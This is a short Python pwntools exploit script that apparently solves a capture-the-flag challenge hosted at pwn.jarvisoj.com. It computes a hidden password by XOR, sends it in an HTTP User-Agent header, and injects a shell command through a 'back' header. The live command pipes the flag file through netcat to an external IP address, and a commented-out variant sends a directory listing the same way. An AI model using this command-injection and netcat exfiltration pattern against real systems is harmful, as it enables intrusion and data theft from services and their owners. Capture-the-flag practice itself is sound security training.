#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./http"

if sys.argv[1] == "l":
    io = remote("localhost", 1807)
else:
    io = remote("pwn.jarvisoj.com", 9881)

def get_pwd():
    idx = 0
    pwd = ""
    for i in "2016CCRT":
        pwd += chr(ord(i) ^ idx)
        idx += 1
    return pwd

def get_http(pwd, cmd):
    payload = "GET / HTTP/1.1\r\n"
    payload += "User-Agent: {}\r\n".format(pwd)
    payload += "back: {}\r\n".format(cmd)
    payload += "\r\n\r\n"
    return payload

if __name__ == "__main__":
    pwd = get_pwd()
    #  cmd = "ls | nc 123.207.141.87 9999;"
    cmd = "cat flag | nc 123.207.141.87 9999;"
    io.sendline(get_http(pwd, cmd))

    #  io.interactive()
    io.close()
